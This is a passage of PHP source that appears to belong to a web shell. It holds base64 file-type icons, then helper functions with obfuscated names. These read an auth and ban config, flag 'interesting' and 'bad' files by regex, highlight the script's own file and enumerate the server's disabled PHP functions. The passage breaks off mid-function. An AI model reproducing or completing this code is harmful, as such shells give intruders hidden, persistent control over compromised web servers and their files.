    "mp3" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGnSURBVDiNpZBPaxNRFMXPjFcSGtrQDiYNUgxKN0LqZ2hApAs/Ql1ZN3Vp6Kbgxp3duPAbFLor0m132XQRKvUZUGegBq2EYBU78wIz789cFyXSOtPQ0gMPHpdzf/fc63Q6nYfGmI00TRdwBbmuK4johdNut0W9Xm9Uq1W4rnup5jRNMRgM0Ov1PpJSquF5HpRSVwkAz/Pg+36DrLWw1mYMYcI4OrH4+lMh6Mf49G0IcRhh79V9AMCoj4wxYOYM4Nn2H8gwQRTGkGECGZ3+z3qNMSCtdS5Ahgnqk4zbtSLmpku4d6uAR+sfznm11iBrbS4gCmO8eTqXqZ/1jl1BhkluPbPChYDomoDRwQ4Oh3i++QPfTwzgOuMBn/sJ1t4dw+/HkFKBmdHaOsIXZwKYcVDNAbgjADPj5c4x3g9v4FexiEptEsyMxw+mMBVK3Ikl3j6p/fMyczbB4t2b2N/9jdmig9fLs2BmrC5VsLpUGX8DrTWICCtNDytNL9f8v4wxpysQkS+EgFLqXLxxTykFIQSIyKdSqdQKgmCj2+3OXzguR4VCISiXy62/DsFP85AcHBcAAAAASUVORK5CYII=",
    "ttf" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIHSURBVDiNlZJBaBNBFIb/newmxRRT3EqqobhRDCiJB+vBUxHBgxavevLgwbuCBcGexUNPlZ5EpCAIhXiViiJEbQIpttRFya5mkyZE0iSVom3dnTe7HlIDWzdQf5jL+9//DW/mScVi8RIRTbuuewb/IcbYqizLd6VcLreqaVomHo+DMbavsOu6aDabqFQqn2THcTKqqsJxnMBmIVzcf7QAAHh4+3KvrqoqDMPIyEIICCH63rawaKCxvglJAnZsjoGwvAvu5hgRwfO8wLP5cwev8yWcO50A54RqY8PnExEY57wv4PnLZUyMn0JKGwaRQLnW8fmcczAhRGDYqndQqXcwPnYcx44MQQiBcq3t6xFCQP47wl49yRZw4+oYAA+jI13At7WWr5eIggEfli0MHRxASjsMz/MQVkIYUQdh1dsgEgiFWH+AwwlPs4uYuJBGbulrr67IEn7bDqrfN5BMqP0B2VcrODE6jK1tG1vbdq8+eCDcHaPagnb0UDCg/eMX3hZKmJm6hrAS8o318XMNhRULZnUdF8+nggGP59/j+pWzUGT2z7skEyqICIbV7HlE1F2ktUYbN+/N4U3+C+Ze5FGutXzf9W7JxJ0H8xBCQDfquDX1DLbtgIggzc7OlpLJZCqdTkNRlOB93iPOOXRdh2VZhhyNRidN05zWdf3kvtK7ikQiZiwWm/wDf6N/hwnofhAAAAAASUVORK5CYII=",
    "jpg" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIcSURBVDiNlZJNTlNhGIWf9+v9bi8FqnANjVHToCE6ANbgxGUYN8EiTGQJrsC4AgdOGOgABkCjicVII1qr/LS0vbf9fh1gwszQd36enPOeI7u7u8+MMdsxxk1mOBE5SNN0S3Z2dg6azeZGo9FAKXUjcQiBXq9Hp9M5TIwxG3meY4yZxQB5ntNutzcS5xzv9g95/votsVYhaoVMPTJ2SBmQSUAmEWVALIgXAN68eoFzjsQ5R3cwYPl+E5nXBC1MLwvi0JBahSojYWShDIgVlFeIwFl/zLxyJNZaVK1G404DVdUEAk47wnyAiUcM6GmkPC9JKxlZrYZSglRTbGGvHFSU5unjR3y6GLOgFRdjQ6xFcIJYoWYD7rYnRE1taZEs04j2VxG89yhV4ecQ1u+tcNIfczeZp55ozieRlVRzfDxgablKVCmrj5aIaQLSxXuPcs5BgBgjE+tQUVitz/HroqQYTOn1CvIsJUOhBUZDQ7c3Rny8fqLygcuzEeNRSXCBD51z/NTjho5CKnQLjy0cWX2O3u8qIkK4lV0DEufon5xSSROCD5ixYTIo8YVFoQg2XpV/BhWdXAE2Hl4DqlPLny8/ULpC9AFTTHCl+++QnH1wDWjkdU6/fZ1piSv5Iv3uvxY2nzT5/v7lTIDhcMjn/Y8kSqn23t7e2vr6OlrrG4mttbRaLZRS7WRhYWHr6Ohou9Vqrc3iIMuydr1e3/oLlTAupOJParwAAAAASUVORK5CYII=",
    "css" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHNSURBVDiNlZK9bhNBFEaPZ2e8axvbImtpgcpCIkIiToOgoqXlAWiQeAAaSB16/AC8Bq/g1lUWV+vGrVG0koOw1zt/FAOJrITE3G6k+c7cc+80ptPpa2PM2Dl3zH+UECKXUn5qTCaTfDgcjrIsQwixV9g5x3K5ZLFYfJd1XY/SNKUYv8f8LAGQ3QOGH77eCknTlKIoRtJai7WWh65EdRsAaFfivb8V8DcnjTF471HO4rdbAJSK7wQAGGOQWmu894jHzxH1BgDfbOH2AGitkdZavPcU0RTNeeggGlCefmN7sQYg7rV58fnNjRqXCll7ifwzA2OXdMwBzW4GQG30jUrGmCuAEGBNUBBRgnQCW9UAyGZ0N0ANXoENLRO1aT1N8VsLQCPeA3D6Q7OqfgHQTxRnasW5DlsZqJjD8Rmri3Du92K+fDzeBVQP1rRVAkCl15TlI6J7CoDSaDa0SO43AdjYGu/9LsBElrUJCs0oRhqoqvBiIgXOSzaboBQruQvQWvOsc8SWKlwgoZclrHXwbqsGWSOm0sE9UeEPGGOQUsoiz/PDt0fvUEpdTejltZldltaaPJ8hpSxkp9M5mc/n49ls9uTfkesVx/G83++f/AbgZRYV7aahUwAAAABJRU5ErkJggg==",
    "html" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJ/SURBVDiNlZM9b1RXEIafe+65d9d79wP7rr1oMeCAsOTEjpBQKBBJlygSTZQ+HT8B/gUVok2RPp0lJIjSWJFSGCS02aBk14XBCWZtgyzb7OJ7zpmh2NgUTgFTz/vMzDsz0erq6tfe+zsi8jkfEcaYjrX2VrSystKZm5tbarVaGGM+SCwiDAYD1tfX/7BFUSzleU5RFAAo8PDxvzzfGbLx6oDzMzXO5Bl5NeWLS/kxJM9zer3ekg0hEEIA4OXuiJ9/e0atWuaT9ilazSrtqYwgyu9/Dbj/6Dk3v5mnPVXhSGe896gqIsK95afEScKhE2abGQuzk9QnEja29zEmwmO4u/wnzgdUFe89xjmHqvLjw7+RaOzB1fkZUhuTWIOoosBktUR9IsXElp9+7aOqOOcwIYxpG6+GnJup8+Vnp2lkKTY2JLGh8MJgd4iIciavUC4lrG8doKqEELBHI8TGcHV+hnJqMSYiNhE2NjzdeE3hhM23b1BV8lqZYazvRzgCnJ2usb33lkdrW+wNi2O3s1KCicbb8aKMCk/rVOUkYCIxqAhrL/b45ck/PNvaxwfh8oUm31+7SKOSIgKT1ZQkjk4CpuspO7vjNkeHnsdrO7ggBFF8EKrlBBFlNDpkup6eBFxfaHLoHM1qig9Ke6qC84Lzgg8CwN7+kDSG6wvNkwBV5dvLp3mxvcvm1mtmpyu4ILgg7A8LDt6MqJUNN660j/O99+MtOOew1jKZJdz67lMePNmk09+kcOPKaWKYnZrgh6/Ojs/9P7H3Hmut7XU6nfnFxUWSJMHGETeutP/3iVQVAOcc3W4Xa23PZll2u9/v3+l2u5c+7JHHUSqV+o1G4/Y7VN2AN07a1GsAAAAASUVORK5CYII=",
    "txt" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFMSURBVDiNlZA9isJAFMd/hgcWFhZRJFNoLLZ0a7XfStDLrLfwMAqewEILu6xV0lgpgieYj2SbTdhs4qIPhhmG/+drHI/HD2vtKk3Td14Yz/MiEfls7Ha7KAzDUa/Xw/O8p8hpmnK73Tifz1+itR75vo/W+pUA+L5PHMcjcc7hnHuJDJDzxFpLlmUArNdrut1uAVJKcblcSm+lFMPhEABrLWKMKQQWi0XFKQzDyjvHG2MQ51zxsdlsAIoUSimAwjlPM51OixqlCvP5vLbvYDAo3TneWlsW2O/3JadHu8irVAQmk0nJqS7FvwkOh0OJdL/fAeh0OgAEQQDwOMF4PK7dwd95mGC73VbcrtcrQRDU1ioEjDGICLPZrALq9/sl199kay2eiMRRFKG1Jsuyp47WmiiKEJFYWq3WMkmS1el0entqAT/TbDaTdru9/AbO//fVB3FwJQAAAABJRU5ErkJggg==",
    "cpp" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGnSURBVDiNlVIxSxxBGH0zfncrd5oDN3AEUhwJZyFcTBPShqC1IvgLhOQPxN42YJFKQjoLsZBUKZIiaRZSLZFkPDHuNmfnFRdOPIw3881Mqj1Z16D3wWvefO/xvceIOI4XmXnTOfcEY4yUUhHRGxFFkWo0Gq16vQ4p5Z3Ezjl0u110Op0D0lq3wjCE1nqcAxCGIZIkaZG1FtbascQAkOmImeG9zz3+Sob4Fl+g22OUSGDuURnLL6ZQmcxHZGZIYwy89yP8OLrE+499BCVgdWEKi88r2P89xNZeP7fnvYcxBmStzV3w+fsA0xWB1ys1ZJ0+uD+Bs4GFcx5C5GMUIpycajydDSCER0Y/fkgACMAVl0UoGDAD2vhCLzcNM0NmBhnqMxIqHcKwG3E/jy+x9/Uc2rjc7o0GKy+rOO0ZbHzoIdq/wKdogLfbfxAf/sWERMGgEGG+WcbGqxnsfDnHu90+yiWBZ3MB1pbu3a2DzGS+GRYyX98bGRhjQES3lnZdzMyQRJQopaC1LnyU/0FrDaUUiCiharW6nqbpZrvdbo5zQRAEaa1WW/8HGgtKKBMv8f4AAAAASUVORK5CYII=",
    "h" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFkSURBVDiNlZIxbttAEEUfV+OoUKGChVohQAA38hnSuHbnO7iPD5DeB8hBcgKVkd3QQmRQgKHKgNwZSEEuZ3ZSMLIpUwmiD0yxmP2D/+dPtlgszlX1JqV0xhEIIRQi8iWbz+fFdDqdTSYTQgj/RU4psd1u2Ww29xJjnOV5TozxGAHkeU5ZljMxM8zsKDLAjhdUFXffK0oYXA7gB71et1QVaZqmJXWh4L8cV+/3OmiaBjGz/qcE1ICBN072nOETh0HfhuwsvB/gtcMtyFeBCvyjo98UPnSEqh7egSdvFTxB/B6xKyNbZWR3WX8HBxVYq8A+Gx4cmxmhDvjL/k56CngAr/x1Bx46ydTg1k9hb8DJxQk8gifHa38j7N56IMauhepn9eZi9ee4HPzUqVbV67trQVS1zVPkr3kfgqq2FkSkLIqCGOM/r65bMUaKokBEShmNRtfr9fpmuVx+OkbBcDhcj8fj698AUnPo+XFYhgAAAABJRU5ErkJggg==",
    "java" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIPSURBVDiNlZPPaxNBGIafncxumsa0lqUGxGAUrCKpgiIBrYKCFDz0Us/+BfUi9uJd6KHqQQ/qP+DFiwURepHGg0IO2jTQmoiWYrUpUvs76czsrIfQQNttwRfmMDPv+/B93zBOsVi8aYwZtdae4z8khChJKe87hUKhlM1me9PpNEKIaHPhGfbaUGtvraVWqzE7OzsllVK9vu+jlIoMO6u/8Ra/stVo7Dj3fZ9KpdIrgiAgCALCMNyz2Fii7d0D9MU7iJ+fd9xt54QxJjr8d47E2F10Jo/34QnOyvwejzEGqbVuBnaprfgSdeI63vQY9f6HBOmzsMuntUbsV34YS2APHSFM+YjF6UjPgS1s9t1DfpvA+KcRS9+bVW5t7G1hG7Ct+JdXeDPj6MwldCaPO/cJm+zGm3xNbKGEWFtgffAFQDRAZ/LE5ichUDiNZdTxyxBPoU5eJS4EXnW85Y8EmK4s5tgFvJm3OFYRugmC1FHY+ANBg9WBp61hRgLEeg3rdSDWauC6OPVlwjDG1pUbhInDTdN+gI43Q8hfU6gz/dRzgyBcsBYn2CT5fgRH1VHZPhrnb+8EaK2RUrJ66xGxpR+0f3xOW3UCJ7SETgxCS9jeRZDqxvjZ1gsYY5BSykqpVOrJ5XK4rovt7mFl4HHkv2gNWinK5TJSyopMJpPD1Wp1tFwunzowtUvxeLza2dk5/A8rQ4uu8K0RngAAAABJRU5ErkJggg==",
    "js" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGZSURBVDiNlZKxa1NRFMZ/93IhlhQjfUKQog2COEWnKDgK3aKj6OBf4OJg/4FOgtl0sLgJWXUXRIgFh1CQZ1xeBoNQIeKg4uJ9557jUKt9pkZz4Gzf9zvnu+e64XC4LiI9VT3HAuW9z0MId9xgMMhbrVa72Wzivf8vs6oynU6ZTCZvQoyxnWUZMcZFFiDLMoqiaIeUEimlhcwA+74gIpjZwgAAEcGXZYmZ/e6v7/Fbq/BpBLvbuKdX8I9a+P4F+Pi6oi3LkpBSqm5gYNFharhXPWz5JOn6Fu7zO6y2Age0h0dQ+wkAlk7hime4mLCzV7ETnQpARPD7gF+thn3f2yCt3yNdvouVDvfkFuw8rmgPBxho9KgCO3302GnSpdtoOI59+zIDmIngdt9iegQ7ugof+rjnD0AFXetg56/NRKgA/Iv7uJcPsc4NrLaMdTehu1m93TyAtrvYxZuw1KgI5/2DICJ79wwBW1mbmTLPLCL4EEKR5zkxxj8e8+8dYyTPc0IIRajX6xvj8bg3Go3O/HPsgarVauNGo7HxAwJPUB9huYnSAAAAAElFTkSuQmCC",
    "py" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJkSURBVDiNlZO9a1NRHIafe+65uflo2tigKVgxUq0gbUUcREQ3cfALHN0EK66CHVzcXMTJ2X/Af8DJwVYqQqWWNFSbKNaKH63VmCa9yT3n3HscNBeli77z8z783uHnzM3NnTbG3IvjeIL/iBCiIqW86czMzFTK5fJ4qVRCCPFP5TiOWVtbY2VlZVEqpcaLxSJKqQR49PwVzxbf4gqBUhqtFdcunmR071DCFItFarXauIiiiCiKsNZiraXRCpivf+bUkYNk8gUcv4/1AO4/fJww1lp6PWmMwVoLQLPdYW7pHZtByHRllVani47gR6CxTifhejHGILXWWGt58vINs6+/0OxEbHZjgkaTTjdEOR6trqE/FRK+uA64iNEbyPwIWmtE7/zpxVUqGw5LGxEfWoKvyqNFFhUJsukMGbYoFPawM1wgrN5NZiQTgtCg4gyu9PBcS9T4hI/CcyDrhlwafY8XZSBSEDWw1v6a0BNopcBxSPk+pcY8t868YyjXxuouKdcl7wtoLEMUEMdsF6SFxrcWwk0uT7zn0Ege2uugO6DasNUC3QXhEWqPzG+B6AmunjvOfucjO7of2NXXBrOMdbZotjb4sdWioX2+iTKrqowdOrv9guHSILcnLwCgl2Yh0wcyhacjYiNofFcEg1fonzhBxu/fLvgzOs5DLotjArLpAmvNo8TBU/p2H8NN5RM+EWitkVImAnd4klrlAdKzxFZi1AJix3nS6cJfZWMMUkpZq1Qqo2NjY3ieB4DM76P/8J1tT9Qra62pVqtIKWsyl8tN1ev1e9Vq9cA/veLv+L5fHxgYmPoJJsCGQPCg5+wAAAAASUVORK5CYII=",
    "diz" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAD9SURBVDiNzVCrjoRAEKyddIJAIEZgMSc5D34TFF9z+xf7NQgMDoHBzaHAYPmFmZ7hxIXN7oYhh7tOKun0o1JVl77vr8x8d8594kQJIRQRfV3atlVJkqRxHEMI8adn5xyWZcE8z9+ktU6llNBanxEAKSXGcUzJWgtr7alnANj+iJmxruvuUdd1AIA8z3f3zAwyxngJtrlvb4wBWWu9B1mWHRIcWqiq6tGXZem1IDaCdxRF8WJlD8zsV/A881n4HwTeDJqmeRzWdX2cgTEGRPTC/hzingpm/lVARKNSClprb9rv0FpDKQUiGikMw9s0TfdhGD52jXoqCIIpiqLbDyVJHq338QJuAAAAAElFTkSuQmCC",
    "cmd" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHiSURBVDiNlZK9a1NhFMZ/933P/Qgp6XDFki2LLjZFdKoEWpBY/4Vg/oNSFPuRbiKunaWEqhQRcZdOQrldHKJLkikB6dpF7VAJyfu+1yFfHXsPnOXA+Z3nPDxeq9WqGmMOnHMrZCilVFtEdryzs7N2qVQqLy0toZS60bJzjouLC87PzzsyHA7LcRwzHA6zCCCOY3q9XlmstdRqNZIkyQRYW1tjc3MTZYzJvAyQJAnGGNRoNJoNC4VCJshoNEJZa2eDTqdDo9GgUCjgeQqtNFoLon1E+2gtaKXxvLHZ1trxC9OqP6uzuvqIdrvDfmOfW/FtoiBHFE46yBEGOaIgIgwijDGIMQalNKKFH62f1Gt1tp5v0djfo1gs8vrVGzw8AFJS0jTFOYdL7RzgS4BooVKpsL3zkvJKmaPmO94fHRMFOZgAIMWlbgxw1wCiBRGf448f+PzpC9sv9rj8c4lSQhjk8LyJgul1Z7DXAQCihMfrG/z9fYmI4PshyfdvLCzkZx6tPlgfX7YaM7iaA6obVU6+nvDv1xVq4rxWmvv3HqKUnkV8Kt06y5On1Tng8PAtURRlysBgMKDZbCIi0js9Pb27vLyM7/s3DlC320VEepLP53f7/f5Bt9u9k0VBGIb9xcXF3f+O+N/4FuZWJwAAAABJRU5ErkJggg==",
    "xml" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHGSURBVDiNlZLPSlthEMV/98t3c4PBXJtbSCEg2RQkNN34DC5cuOgL+BT1LXwAX6R7CegmReE2tHAjKsQ/pCuDBsn3504XMTeNLaUZmMUMZ86cOUzQ6/V2nHOHeZ5/ZIVQSqVa689Bt9tNW61Wp9FooJT6r+E8zxmNRlxfX3/TxphOkiQYY1YRQJIkZFnW0d57vPcrDQPM57RzDhF5pVFABQAEE0NgPXmtUvTm4ZxDWWsRkSLLJ1eou3FRV758R/fvUXdjyidXS1hrLcp7XzSi7iXh+S2+vjZT9WzRP0aYdgNfXyM8vyXqXhZ47z1qfkJ0fEF4NuRxf5s8KiEihP17/NsqPq6QRyUe97cJz4ZExxeICM65hQfB0xQBpBQUnoRfh5jOu4VHpQCBGfaFoFAw2d3Cbm6wfnQKU0cwfkZnP5nOCaaO9aNT7OYGk92tPwlEhMleG9uMUTcPlHtDbKuOr5YREdTNA7YZM9lrF/ilE+bx9OkDgfWIVovtgGvWsK038Bv2rwQAohV5s/ZSSNHjFa4gsNaitV7pE51zMw+01lmaphhjlp7kX2mMIU1TtNaZrlarB4PB4LDf779fRUEURYM4jg9+AY0DZ4cpAUR4AAAAAElFTkSuQmCC",
    "avi" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJgSURBVDiNlZO9bhtHFIW/mZ2d3RVXJEs1hBMYCQtFhhYp1QgR8g58Cbmy38JurJcI8hCBmq0JxEVAG8gP1KiUREhczp2fFLMJbHe+7WDunHO+M+ri4uJn7/0bpdSLl9/8RdFU6MpS2BJVGgCSeIIT4t4Rdnve/f0tKaXfjTGvzG63e9v3/cnl5SU/Pj+ksBZdlejSoAqdF4RIFE/cC8E5fmifcXV19eLs7Oyt8d6frFYr7u7ueAjvsbWlqPLrSo8LYswq9oIbHB//dKxWK7z3J+r09DSt12vOz8/5mrm+vqbrOtTx8XGazWYAXJ38Q12XaGvRpYbRAiESJRKdYxiEy/fPALi/v0d77+n7HhHhcFJStzXNtKaZTTiYtxzMW5rZhGZaU7c1h5MSEaHve7z3GO89XdcBoKuSorYUTZ1pjBSieMJuP+YREBG6rsN7jxYR1us1IoIqCpQp0KWhqCxle0DZHlBUNlMxBaoo+PSO8d6zXC6z16RIMZFSIsWM7n8KKZFigpQQEZbLZVbgvWez2SAimbUIcXD4pwHZPiLbR/zTQBxcPhOPiLDZbHIGIQQWi0UOe1CgFMSEHi3lIoWcw94RBodIYrFYEELIFm5ubjg6OmL/lLCjdG2Kz4oUfSA6wQ2CiOL29pb5fI5q2zZZa7+qRP+Ncy4r2G63TKdTfltNqJsKbUt0WXzxF7KCYbfnp18eeXh4oGkaTAjhQ1VV32utmR3WuQO1RdsSZcYMRvlhcFRGIXJHVVWklD6YGOPrGOMbpdR3v/7xhLYeXRp0WX6hYKTkHM45Ukoftdav/wWP7nOnXPYUNgAAAABJRU5ErkJggg==",
    "xls" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGUSURBVDiNjZMxa9tAGIbfyAeOAo1iuFsEJmA56RS62SZLfkTH/IpCO5bQIT8he5f+hC79A7ZXBZo0NhmkRcQKpJAW4/vuvgzNXSTbSXogEJ907/O8J7Tx7Xv6YZLPTsu7PyEAHB8pWGvx2gqCIBVCfNz4fPbj79abVrjbjtFoBHh/qMDML24mIuR5jqIozkVR/g7ftfdxXcxhmaH1DojoVYM4jpFl2YEgY3B7b2AfqcwMZsZwOAQAKKUwm838RqUUut0umBnGGAhDBDJPnV3AYDDwsyRJanRXkYggiAyqZ+YCptOpJ1ctnAEAaK0hjCWvXw1JkqRGrt47g8cKBtZy7SEzYzQa1ehKqZUqRARhjIGpCLiAfr/vZ51Op0ZeCqCawboXn1veoHoGzmA8HvuZlBIAUJYlpJS+ylPAmq/Q6/VWiMtV/gXQ+grOQErpyXEcIwzD1QqaCEFDPGvgyMt0IkIgW9vzm+wnSGtYyz7gpWuxWCBNUwghrsTbvfjLxa/85HJ0sQkAX3X0Xz9Ts9mcRFH06QFIsTx57QMZyQAAAABJRU5ErkJggg==",
    "pl" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAsBJREFUOMuV08trXHUUwPHv73fvzJ1H53HlJmPStE2tdtEmXVhfzVSqkNpShCClCykFl26KG/sXdFtw5cKl/hlCDQQVbSjVzlhkZiCTKiZjJzWTed7f79x7uwg0uBDs2R7O5zzgqPX19YsicieO4zO8QGitH7qu+7laW1t7OD8/v1ipVNBa/6/iOI7pdDq02+2aa4xZzOZyDIZDtNZorVGA0hqlFGq/HSpJUEoBkCQJQRDQaDQWdRRFaKWeJ8UKe70uYi3j0ZA/278hJtyHlQKlcBwHx3GIoghXREAptNYYY2g3f6X7+HuOn77MXq/DaHeDbGGKIKhgrWXQ3yHlFTiUzyMiuNZalNaEkwl7vS6FvGXq7AW8NKR0hlL+KGawyZNEYSY9vrz9KUsXr1Bd/gRrLW4URYgxdDp/ED59hCQJo40uM4ePYCd9lNY4Toqdxz+w3XpA9Y1XmTvxNp6XPVhhPB6x0bhPOtzk/i8NHt37juMnXmEmKDCcJISDp7x54RLbm7/jV6aYO3aKYrGIiKBFBGMMg94OX3/1De9evsH1z74At8zdn/7m27v3KB95nQc//4ibzlI5uUy5VMJxnP0biAij0YBWbZ3Fd85z6swSmUyGs0uX2P6rze2bH/H+1Zvkc4fIZLMUij6e55EkyQFgJmOiOOGDD6+Ty+XwPA+lFKN+l/PvnWP28DEKhSJxHBPHMdbafwNpL8Nbyx8j4ycYY0in0ziOgx8cpVAsISJYa7HWIiJEUYRS6gB4eWaOXC5DEgsiwnA4JI5jCqWXOH3uGmKFwWBAq9Xin91dZmdnMWF4ABSLRcplHxH7fHylFL7vMz09TRiG9Pt9tra2WFlZoVar4fv+PuC6bmN1dfXkwsICqVTqPx9IKUW1WqXb7RIEAfV6Hdd1G24+n7/VbDbv1Ov1117knT3Pa5ZKpVvPANPKWvOoFTopAAAAAElFTkSuQmCC",
    "htaccess" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAmFJREFUOMuV089LVFEYxvHvvXOuMzU69zZjlpWl+StzjBTLCAoljSL6sQiDVi2CNhFBSdtwFSK1rL+goCBoaQaGJBWTSONUNpOTlZFTQVZq051z7mkhKaQGvvAuz4fnOfAasVisTUrZ7XneNpYxpmnGhRAXjf7+/nhRIFaHOUl4RRMF4V2ISAhtgIGx6GPP88hkMoyNjQ0L13Xr8go8PqeG+DqUxhkboehoFH9TNUbYwTDFokgkEiGZTNYJpRROyUHM9DdGHnzkSSxDVd8kVXsShA9XYbU04LNDCwClFEopTCklPqsEu+Ik5WsqsXwh7kyEuXlXMnFpgFzXbdxUGq31gpVS4mtvb79cWlqKYYcwNzgY76axxhWDmIxMSza++Elo+CXaFpiVxaDn/yWdTmMqpWZFNIGdFUTPlXGg+hOHPD9fzHV0/Zph8JHF7ys95Hp78JQ7l2CuwnwssFq2s6qzmeaaUU6rH4SNzVwzvjGQXEu28zGq7yHay81V+AfQaG1gtuwgcPUIFVXvOaY8HKOG6ypLb6KeyRuvUB/G0Z63FDC7vsYowfPNbHHe0irzyZnl3MqzePO0COPeM/DU/wG0xjy+l+CpKPX+UXbLMJNelqGpDF/iU2Rnsv8HtNZoD8SZVkpOFNNmvSZqOPRt+sn9xgifsy5SSsRfYKnRThDrwj7KC5+z/7uffruQrD2DszIwD+RyOYQQSyJqdT7Bs000uJLS6fUMx2Lo3GwCUwiRjMfjuK67dBWt0X4fth2grLiYrbW1DCcSCCGSIhgMdqRSqe5EIlG5nHP2+/0p27Y7/gDPzYj0H4o5FQAAAABJRU5ErkJggg==",
);

function z7x($i, $k = '') {
    global $config;
    $m = array("version", "auth", "default_vars", "banned", "use_buffer", "visual", "reg_interesting", "reg_bad");
    if (!@isset($m[$i])) {
        return '';
    }
    return ($k != '') ? (@isset($config[$m[$i]][$k]) ? $config[$m[$i]][$k] : '') : (@isset($config[$m[$i]]) ? $config[$m[$i]] : '');
}

function z3c($i, $t) {
    if ($t != 'd' && $t != 'f' && $t != 'l' && $t != 'e') {
        return '';
    }
    if ($t == 'l' || $t == 'e') {
        $t = 'f';
    }

    $cs = z9w('reg_self');
    $ci = z9w('reg_interesting');
    $cb = z9w('reg_bad');
    if ($t == 'f' && $i == @basename(__FILE__)) {
        return (($cs != '') ? ' style="color: ' . $cs . '";' : '');
    }
    foreach (z7x('6', $t) as $r) {
        if (@preg_match('/' . $r . '/i', $i)) {
            return (($ci != '') ? ' style="color: ' . $ci . '";' : '');
        }
    }
    foreach (z7x('7', $t) as $r) {
        if (@preg_match('/' . $r . '/i', $i)) {
            return (($cb != '') ? ' style="color: ' . $cb . '";' : '');
        }
    }
}

function z6j() {
    $i = @ini_get('disable_functions');
    if ($i != '') {
        $f = @array_map('trim', @explode(',', $i));
        @sort($f);
        return $f;
    } else {
        return array();
    }
}

function z9w($i) {
    global $color_skin;
    $a = z7x('5', $color_skin);
    return @isset($a[$i]) ? $a[$i] : '';
}

function z9s($k, $w = '', $u = 0) {
    global $lang;
    $l = z7x(2, "language");
    $r = '';
    if (!isset($lang[$l][$k])) {
        return "?";
    }

    $r = $lang[$l][$k];
    if ($w !== '') {
        if (@is_array($w)) {
            for ($i = 0; $i < @count($w); $i++) {
                if (@isset($w[$i])) {
